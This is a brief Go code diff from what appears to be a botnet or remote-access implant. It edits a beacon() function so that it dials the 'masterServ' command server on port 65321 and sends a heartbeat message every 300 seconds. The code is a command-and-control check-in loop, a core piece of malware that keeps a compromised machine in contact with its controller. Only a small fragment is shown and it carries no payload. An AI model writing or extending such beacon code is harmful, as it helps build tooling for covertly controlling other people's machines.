@@ -21,10 +21,9 @@ const (
 )
 
 func beacon() {
-	conn, err := net.Dial("tcp", masterServ)
+	conn, err := net.Dial("tcp", (masterServ + ":65321"))
 	errorHandler(err)
 	for true {
-
 		time.Sleep(300 * time.Second)
 		conn.Write([]byte(writeData(true, "NULL")))
 	}
